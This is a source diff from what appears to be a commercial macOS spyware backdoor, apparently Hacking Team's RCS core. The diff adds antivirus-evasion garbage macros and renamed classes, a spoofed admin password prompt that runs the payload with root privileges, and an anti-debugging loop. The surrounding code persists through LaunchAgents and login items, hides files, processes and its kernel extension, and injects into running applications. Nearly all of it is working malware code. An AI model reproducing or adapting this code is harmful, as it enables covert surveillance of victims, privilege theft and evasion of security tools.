+  NSString *launchAgentPath = [NSString stringWithFormat: @"/Users/%@/%@/%@",
+                               NSUserName(), LIBRARY_NSSTRING, LAUNCHD_DIR];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentPath] == NO)
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Factory restored machines don't have this dir
       mkdir([launchAgentPath UTF8String], 0755);
 
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Now chown it -> ourself
       NSArray *_tempArguments = [[NSArray alloc] initWithObjects: @"-R",
                                  NSUserName(),
                                  launchAgentPath,
                                  nil];
 
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       [gUtil executeTask: @"/usr/sbin/chown"
            withArguments: _tempArguments
             waitUntilEnd: YES];
 
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       [_tempArguments release];
     }
 
@@ -3165,6 +4109,10 @@ void lionSendEventToPid(pid_t pidP)
   // otherwise add all the required files for making it resident
   if ([self isBackdoorAlreadyResident] == NO)
     {  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
           || ([workingMode isEqualToString: UISPOOF])
           || (noPrivs == YES))
@@ -3178,6 +4126,9 @@ void lionSendEventToPid(pid_t pidP)
         }
     }
     
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [workingMode release];
   
   //
@@ -3189,25 +4140,39 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
           errorLog(@"Error while creating shared memory");
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
           return NO;
         }
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   //XXX-  
   if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                            isDirectory: NULL])
     {
       [self _createInternalFilesAndFolders];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       [self _dropOsaxBundle];
       
-      // Drop xpc services for sandboxed app
-      if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
-        {
-          [self _dropXPCBundle];
-        }
+    //XXX- for av problem
+//      // Drop xpc services for sandboxed app
+//      if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
+//        {
+//          [self _dropXPCBundle];
+//        }
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
                            toTarget: self
                          withObject: nil];
@@ -3215,7 +4180,10 @@ void lionSendEventToPid(pid_t pidP)
 #ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (getuid() != 0 && geteuid() == 0 && [gUtil isLion] == NO)
     {
       if ([self connectKext] == -1)
@@ -3224,6 +4192,9 @@ void lionSendEventToPid(pid_t pidP)
           warnLog(@"connectKext failed, trying to load the KEXT");
 #endif
 
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           BOOL res = is64bitKernel();
           if ([gUtil loadKextFor64bit: res] == YES)
             {
@@ -3249,13 +4220,18 @@ void lionSendEventToPid(pid_t pidP)
         }
     }
   
-
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (kextLoaded == 1)
     {
 #ifdef DEBUG_CORE
       infoLog(@"kext loaded");
 #endif
-      //
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Since Snow Leopard doesn't export all the required symbols
       // we're gonna solve them from uspace and send 'em back to kspace
       [self _solveKernelSymbolsForKext];
@@ -3264,22 +4240,36 @@ void lionSendEventToPid(pid_t pidP)
       os_ver.major  = gOSMajor;
       os_ver.minor  = gOSMinor;
       os_ver.bugfix = gOSBugFix;
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // Telling kext to find sysent based on OS version
       ret = ioctl(gBackdoorFD, MCHOOK_FIND_SYS, &os_ver);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       //
       // Start hiding all the required paths
-      NSString *backdoorPlist = [[NSString alloc] initWithString: BACKDOOR_DAEMON_PLIST];
+      NSString *backdoorPlist = [[NSString alloc] initWithFormat: @"%@.%@.%@.%@", 
+                                 DOMAIN_COM, DOMAIN_APL, LAUNCHD_NAME, LAUNCHD_EXT];
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding LaunchAgent plist");
-#endif
+#endif  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Hiding LaunchAgent plist
-      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
+      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[backdoorPlist fileSystemRepresentation]);
       
       [backdoorPlist release];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Hide only inputmanager not osax
       if ([gUtil isLeopard])
         {
@@ -3287,7 +4277,10 @@ void lionSendEventToPid(pid_t pidP)
           infoLog(@"Hiding InputManager");
 #endif
           NSString *inputManagerPath = [[NSString alloc]
-                                        initWithString: EXT_BUNDLE_FOLDER];
+                                        initWithString: IM_NAME];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
           
           // Hiding input manager dir
           ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
@@ -3311,26 +4304,46 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
       infoLog(@"Hiding backdoor dir");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Hiding backdoor dir
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[appPath fileSystemRepresentation]);
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding process %d", getpid());
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Hide Process
       ret = ioctl(gBackdoorFD, MCHOOK_HIDEP, [NSUserName() UTF8String]);
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding KEXT");
-#endif
+#endif  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+
       // Hide KEXT
       ret = ioctl(gBackdoorFD, MCHOOK_HIDEK);
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding /dev entry");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Hide KEXT /dev entry
       NSString *kextDevEntry = [[NSString alloc] initWithCString: BDOR_DEVICE];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[kextDevEntry lastPathComponent] fileSystemRepresentation]);
       
       [kextDevEntry release];
@@ -3341,12 +4354,22 @@ void lionSendEventToPid(pid_t pidP)
   // Inject running ActivityMonitor
   if ([gUtil isLeopard] == NO && geteuid() == 0)
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       NSNumber *pActivityM = pidForProcessName(@"Activity Monitor");
       
       if (pActivityM != nil) 
-        {
+      {      
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+        
           NSNumber *thePid = [[NSNumber alloc] initWithInt: [pActivityM intValue]];
-          
+        
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+        
           [self sendEventToPid: thePid];
           
           [thePid release];
@@ -3354,18 +4377,27 @@ void lionSendEventToPid(pid_t pidP)
     }
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   // inject all running apps in the ws
   [self injectRunningApp];
   
 #ifdef DEBUG_CORE
   infoLog(@"injectRunningApp done!");
 #endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
                                                              name: NSWorkspaceDidLaunchApplicationNotification 
                                                            object: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // Register notification for terminate process for Crisis agent
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
@@ -3373,10 +4405,16 @@ void lionSendEventToPid(pid_t pidP)
                                                              name: NSWorkspaceDidTerminateApplicationNotification 
                                                            object: nil];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   // Load configuration, starts all agents and the events monitoring routine
   [taskManager loadInitialConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // Set the backdoorControlFlag to RUNNING
   mMainLoopControlFlag = @"RUNNING";
@@ -3384,10 +4422,16 @@ void lionSendEventToPid(pid_t pidP)
   [gControlFlagLock lock];
   taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
   [gControlFlagLock unlock];
-
-  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
   [infoManager logActionWithDescription: @"Start"];
   [infoManager release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   // set desktop background for demo mode
   [self checkAndRunDemoMode];
@@ -3395,187 +4439,21 @@ void lionSendEventToPid(pid_t pidP)
   // Main backdoor loop
   [self _communicateWithAgents];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [innerPool release];
   
   return YES;
-}
-
-- (void)sendEventToPid: (NSNumber *)thePid
-{
-  AEEventID eventID = 'load';
-  int eUid = geteuid();
-  int rUid = getuid();
-  int maxRetry = 10;
-
-  if (thePid == nil)
-    return;
-
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
-  // On lion fork to sendEvents without problem
-  if ([gUtil isLion]) 
-    {
-      NSTask *aTask = [[NSTask alloc] init];
-      NSMutableArray *args = [NSMutableArray array];
-      NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
-
-      //argv
-      [args addObject: @"-p"];
-      [args addObject: pidStr];
-      [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
-      [aTask setArguments:args];
-
-#ifdef DEBUG_CORE
-      verboseLog(@"Running task with args %@", args);
-#endif
-
-      [aTask launch];
-      [aTask release];
-      [pidStr release];
-      
-#ifdef DEBUG_CORE
-      verboseLog(@"task launched");
-#endif
-      return;
-    }
-
-  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
-
-  [gControlFlagLock lock];
-  NSString *localFlag = [_taskManager getControlFlag];
-  [gControlFlagLock unlock];
-
-  if ([localFlag isEqualToString: @"STOP"])
-    {
-      return;
-    }
-
-  pid_t pidP = (pid_t) [thePid intValue];
-
-  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
-
-#ifdef DEBUG_CORE
-  verboseLog(@"send event to application pid %d", pidP);
-#endif
-
-  [gSuidLock lock];
-
-#ifdef DEBUG_CORE
-  verboseLog(@"enter critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  // trimming process u&g
-  if (eUid != rUid)
-    seteuid(rUid);
-
-  [app setTimeout: 1];
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  [app sendEvent: kASAppleScriptSuite
-              id: kGetAEUT
-      parameters: 0];
-
-  sleep(1);
-
-  
-  NSNumber *pid = [NSNumber numberWithInt: getpid()];
-  
-  [app setTimeout: 1];
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  id injectReply = [app sendEvent: 'RCSe'
-                               id: eventID
-                       parameters: 'pido', pid, 0];
-
-  // Check if the seteuid do the correct work...
-  while ((geteuid() != eUid) && maxRetry--) 
-    {
-      // original u&g
-      if (seteuid(eUid) == -1)
-        {
-#ifdef DEBUG_CORE
-          infoLog(@"setting euid error [%d]", 
-                  errno);
-#endif
-        }
-
-      usleep(500);
-    }
-
-  [gSuidLock unlock];
-
-#ifdef DEBUG_CORE
-  verboseLog(@"exit critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  if (injectReply != nil) 
-    {
-#ifdef DEBUG_CORE	
-      warnLog(@"unexpected injectReply: %@", injectReply);
-#endif
-    }
-  else 
-    {
-#ifdef DEBUG_CORE
-      verboseLog(@"injection done");
-#endif
-    }
-
-  [pool release];  
-}
-
-- (void)injectRunningApp
-{
-  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
-  
-  NSWorkspace *ws = [NSWorkspace sharedWorkspace];
-  
-  NSArray *apps = [ws runningApplications];
-  
-  if (apps && [apps count]) 
-    {
-      for (int i=0; i<[apps count]; i++) 
-        {
-          NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
-          
-          pid_t tmpPid = [app processIdentifier];
-          
-          NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
-          
-#ifdef DEBUG_CORE_
-        infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
-              [app localizedName], [app processIdentifier]);
-#endif
-          [self sendEventToPid:thePid]; 
-          
-          [thePid release];
-          
-          usleep(500);
-        }
-    }
-    
-  [pool release];
-}
-
-- (BOOL)isCrisisHookApp: (NSString*)appName
-{
-  if (gAgentCrisisApp == nil)
-    return NO;
-  
-  for (int i=0; i<[gAgentCrisisApp count]; i++) 
-  {
-    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
-    if ([appName isCaseInsensitiveLike: tmpAppName])
-      return YES;
-  }
-  
-  return NO;
 }
 
 - (BOOL)isCrisisNetApp: (NSString*)appName
 {
   if (gAgentCrisisNet == nil)
     return NO;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   for (int i=0; i<[gAgentCrisisNet count]; i++) 
   {
@@ -3584,6 +4462,9 @@ void lionSendEventToPid(pid_t pidP)
       return YES;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return NO;
 }
 
@@ -3591,31 +4472,69 @@ void lionSendEventToPid(pid_t pidP)
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSDictionary *appInfo = [notification userInfo];
   
 #ifdef DEBUG_CORE
   infoLog(@"try to stop crisis agent sync for app %@ (gAgentCrisis)", appInfo, gAgentCrisis);
 #endif
   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if ((gAgentCrisis & CRISIS_SYNC) &&
       [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
   {
-
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008
+    
     gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
 #ifdef DEBUG_CORE
     infoLog(@"Sync enabled! gAgentCrisis = 0x%x", gAgentCrisis);
 #endif
   }
-    
+  
   [pool release];
+}
+
+- (BOOL)isCrisisHookApp: (NSString*)appName
+{
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  if (gAgentCrisisApp == nil)
+    return NO;
+  
+  for (int i=0; i<[gAgentCrisisApp count]; i++) 
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
+    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
+    if ([appName isCaseInsensitiveLike: tmpAppName])
+      return YES;
+  }
+  
+  return NO;
 }
 
 - (void)injectBundle: (NSNotification*)notification
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSDictionary *appInfo = [notification userInfo];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (appInfo == nil)
     {
       [pool release];
@@ -3628,7 +4547,10 @@ void lionSendEventToPid(pid_t pidP)
   
   if ((gAgentCrisis & CRISIS_START) && 
       [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
-  {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
     gAgentCrisis |= CRISIS_SYNC;
 #ifdef DEBUG_CORE
     infoLog(@"Sync disabled! gAgentCrisis = 0x%x", gAgentCrisis);
@@ -3644,6 +4566,9 @@ void lionSendEventToPid(pid_t pidP)
     return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
     {
 #ifdef DEBUG_CORE
@@ -3652,6 +4577,10 @@ void lionSendEventToPid(pid_t pidP)
       // Only for leopard send pid to new activity monitor via shmem
       if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
         {
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           // Write command with pid
           [self shareCorePidOnShMem];
         }
@@ -3660,16 +4589,26 @@ void lionSendEventToPid(pid_t pidP)
     {
 #ifdef DEBUG_CORE
       infoLog(@"sendEventToPid");
-#endif
+#endif  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       // temporary thread for fixing euid/uid escalation
       pid_t tmpPid =  [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] intValue];
       NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
-     
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
      [self sendEventToPid: thePid];
      
      [thePid release];
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [pool release];
 }
 
@@ -3677,7 +4616,14 @@ void lionSendEventToPid(pid_t pidP)
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableData *pidCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   pid_t amPid = getpid();
   
 #ifdef DEBUG_CORE
@@ -3690,6 +4636,9 @@ void lionSendEventToPid(pid_t pidP)
   shMemoryHeader->command           = CR_CORE_PID;
   shMemoryHeader->commandDataSize   = sizeof(pid_t);
   memcpy(shMemoryHeader->commandData, &amPid, sizeof(pid_t));
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([gSharedMemoryCommand writeMemory: pidCommand
                                  offset: OFFT_CORE_PID
@@ -3706,50 +4655,376 @@ void lionSendEventToPid(pid_t pidP)
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [pidCommand release];
   [pool release];
 }
 
-- (int)connectKext
+- (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized
 {
+  AuthorizationRef myAuthorizationRef;
+  
+  OSStatus myStatus;
+  FILE *myCommunicationsPipe  = NULL;
+  NSString *execPath          = nil;
+  
+  //AuthorizationExternalForm extAuth;
+  char myReadBuffer[256];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  //
+  // ExtendRights here is used in order to do the infamous sudo
+  //
+  AuthorizationFlags myFlags = kAuthorizationFlagDefaults
+  | kAuthorizationFlagInteractionAllowed
+  //| kAuthorizationFlagPreAuthorize
+  | kAuthorizationFlagExtendRights;
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  
+  //
+  // Looks like icns files don't work here .. Only tif(f) atm
+  //
+  NSString *iconDestinationPath = [[[[[[NSBundle mainBundle] bundlePath]
+                                      stringByDeletingLastPathComponent]
+                                     stringByDeletingLastPathComponent]
+                                    stringByDeletingLastPathComponent]
+                                   stringByAppendingPathComponent: @"_sys.tiff"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+  NSString *iconCurrentPath = [[[NSBundle mainBundle] bundlePath]
+                               stringByAppendingPathComponent: ICON_FILENAME];
+  
+  // If we're authorized we can execute now our backdoor properly
+  if (amIAlreadyAuthorized == YES)
+  {
 #ifdef DEBUG_CORE
-  infoLog(@"Initializing backdoor with kext");
+    infoLog(@"Already authorized, relaunching the original file");
 #endif
-  
-  gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
-  
-  if (gBackdoorFD != -1) 
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
+                               [[NSBundle mainBundle] bundlePath]];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    NSArray *_searchedFile = searchForProtoUpload(searchPattern);
+    [searchPattern release];
+    
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
+    [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+                                               error: nil];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
+    if ([_searchedFile count] > 0)
     {
-      int ret;//, bID;
-      
-      
-      ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
-      if (ret < 0)
-        {
+      execPath = [[_searchedFile objectAtIndex: 0]
+                  stringByReplacingOccurrencesOfString: @".ez"
+                  withString: @""];
 #ifdef DEBUG_CORE
-          errorLog(@"Error while initializing the uspace-kspace "\
-                     "communication channel");
+      infoLog(@"execPath: %@", execPath);
 #endif
-          
-          return -1;
-        }
+    }
+    else
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"ez file not found");
+#endif
+      exit(-1);
+    }    
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  [[NSFileManager defaultManager] copyItemAtPath: iconCurrentPath
+                                          toPath: iconDestinationPath
+                                           error: nil];
+  
+  //
+  // Looks like the common practice is to split the AuthorizationItem Rights
+  // from the AuthorizationItem Environment since we need to pass 2 different
+  // objects later on while calling AuthorizationCopyRights
+  //
+  AuthorizationItem myItems;
+  myItems.name         = kAuthorizationRightExecute; // system.privilege.admin
+  myItems.valueLength  = 0;
+  myItems.value        = NULL;
+  myItems.flags        = 0;
+  
+  //
+  // Authentication Icon
+  //
+  AuthorizationItem myAuthItems;
+  myAuthItems.name          = kAuthorizationEnvironmentIcon;
+  myAuthItems.valueLength   = strlen((char *)[iconDestinationPath UTF8String]);
+  myAuthItems.value         = (char *)[iconDestinationPath UTF8String];
+  myAuthItems.flags         = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  AuthorizationRights myRights;
+  myRights.count = 1;
+  myRights.items = &myItems;
+  
+  AuthorizationEnvironment authEnvironment;
+  authEnvironment.count = 1;
+  authEnvironment.items = &myAuthItems;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+#ifdef DEBUG_CORE
+  infoLog(@"Creating authorization");
+#endif
+  
+  //
+  // Create an empty auth ref to fill later
+  //
+  myStatus = AuthorizationCreate(&myRights,
+                                 //kAuthorizationEmptyEnvironment,
+                                 &authEnvironment,
+                                 myFlags,
+                                 &myAuthorizationRef);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  //
+  // errAuthorizationSuccess returned in case of success
+  //
+  if (myStatus != errAuthorizationSuccess)
+  {
+#ifdef DEBUG_CORE
+    errorLog(@"Error while creating the empty Authorization Reference");
+#endif
+    //return myStatus;
+  }
+  /*
+   myStatus = AuthorizationCopyRights(myAuthorizationRef,
+   &myRights,
+   //kAuthorizationEmptyEnvironment,
+   &authEnvironment,
+   myFlags,
+   NULL);
+   
+   if (myStatus != errAuthorizationSuccess)
+   {
+   #ifdef DEBUG_UI_SPOOF
+   errorLog(@"[EE] Error while authorizing the user");
+   #endif
+   
+   [self _createInternalFilesAndFolders];
+   
+   //
+   // Only perform SLI escalation on 10.5 since it doesn't seem to work
+   // on 10.6
+   //
+   if (gOSMajor == 10 && gOSMinor == 5)
+   {
+   if ([self getRootThroughSLI] == YES)
+   {
+   #ifdef DEBUG_CORE
+   warnLog(@"Err on auth, switching to SLI PLIST mode");
+   #endif
+   [gUtil dropExecFlag];
+   }
+   }
+   
+   [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+   error: nil];
+   
+   exit(-1);
+   }*/
+  /*  
+   //
+   // Turn an AuthorizationRef into an external "byte blob" form so it can be
+   // passed over the authenticated execution
+   //
+   myStatus = AuthorizationMakeExternalForm(myAuthorizationRef, &extAuth);
+   if (myStatus != errAuthorizationSuccess)
+   {
+   #ifdef DEBUG_UI_SPOOF
+   errorLog(@"Unable to turn the AuthorizationRef into external form");
+   #endif
+   }*/
+  
+  if (execPath == nil)
+  {
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    if ([gUtil isLeopard])
+    {
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
+      NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
+                                 [[NSBundle mainBundle] bundlePath]];
+      
+      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
+      [searchPattern release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
+      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+                                                 error: nil];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
+      if ([_searchedFile count] > 0)
+      {
+        execPath = [[_searchedFile objectAtIndex: 0]
+                    stringByReplacingOccurrencesOfString: @".ez"
+                    withString: @""];
+      }
       else
-        {
+      {
 #ifdef DEBUG_CORE
-          infoLog(@"Backdoor initialized correctly");
+        errorLog(@"ez file not found");
 #endif
-        }
+        exit(-1);
+      }
     }
-  else
+    else
     {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while opening the KEXT dev entry!");
-#endif
       
-      return -1;
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
+      execPath = [NSString stringWithFormat: @"%@",
+                  [[[NSBundle mainBundle] bundlePath]
+                   stringByAppendingPathComponent: @"System Preferences"]];
     }
+  }
   
-  return 0;
+#ifdef DEBUG_CORE
+  infoLog(@"Executing with auth (%@)", execPath);
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
+  myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
+                                                (char *)[execPath UTF8String],
+                                                kAuthorizationFlagDefaults,
+                                                nil,
+                                                &myCommunicationsPipe);
+  
+  if (myStatus != errAuthorizationSuccess)
+  {
+#ifdef DEBUG_CORE
+    errorLog(@"Error on last step");
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"Auth executed with success (%s)", myReadBuffer);
+#endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
+    fclose(myCommunicationsPipe);
+  }
+  
+  [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
+                                             error: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  //
+  // Free the AuthorizationRef
+  //
+  AuthorizationFree(myAuthorizationRef, kAuthorizationFlagDestroyRights);
+  
+#ifdef DEBUG_CORE
+  warnLog(@"Quitting from auth");
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  exit(0);
+}
+
+//
+// See http://developer.apple.com/qa/qa2004/qa1361.html
+//
+- (void)xfrth
+{
+  while (true)
+  {
+    int                 junk;
+    int                 mib[4];
+    struct kinfo_proc   info;
+    size_t              size;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    //
+    // Initialize the flags so that, if sysctl fails for some bizarre
+    // reason, we get a predictable result.
+    //
+    info.kp_proc.p_flag = 0;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    //
+    // Initialize mib, which tells sysctl the info we want, in this case
+    // we're looking for information about a specific process ID. 
+    //
+    mib[0] = CTL_KERN;
+    mib[1] = KERN_PROC;
+    mib[2] = KERN_PROC_PID;
+    mib[3] = getpid();
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
+    // Call sysctl
+    size = sizeof(info);
+    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
+    // We're being debugged if the P_TRACED flag is set
+    if ((info.kp_proc.p_flag & P_TRACED) != 0)
+    {
+      exit(-1);
+    }
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    usleep(50000);
+  }
 }
 
 - (BOOL)getRootThroughSLI
@@ -3757,6 +5032,9 @@ void lionSendEventToPid(pid_t pidP)
   NSError *error;
   BOOL success;
   NSFileManager *fileManager = [NSFileManager defaultManager];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   //
   // Check if the SLI file already exists
@@ -3768,6 +5046,9 @@ void lionSendEventToPid(pid_t pidP)
       infoLog(@"SLI File already exists!");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       success = [gUtil isBackdoorPresentInSLI: [[NSBundle mainBundle] bundlePath]];
       
       if (success == NO)
@@ -3777,6 +5058,9 @@ void lionSendEventToPid(pid_t pidP)
 #endif
           NSString *SLIBackup       = @"com.apple.SystemLoginItems.plist_bak";
           
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           NSString *SLIDestination  = @"com.apple.SystemLoginItems.plist";
           
           //
@@ -3785,6 +5069,9 @@ void lionSendEventToPid(pid_t pidP)
           [fileManager copyItemAtPath: [gUtil mSLIPlistPath]
                                toPath: SLIBackup
                                 error: &error];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           if ([gUtil addBackdoorToSLIPlist] == NO)
             {
@@ -3801,6 +5088,8 @@ void lionSendEventToPid(pid_t pidP)
           if ([fileManager removeItemAtPath: [gUtil mSLIPlistPath]
                                       error: &error] == YES)
             {
+              // AV evasion: only on release build
+              AV_GARBAGE_002
               if ([fileManager moveItemAtPath: SLIDestination
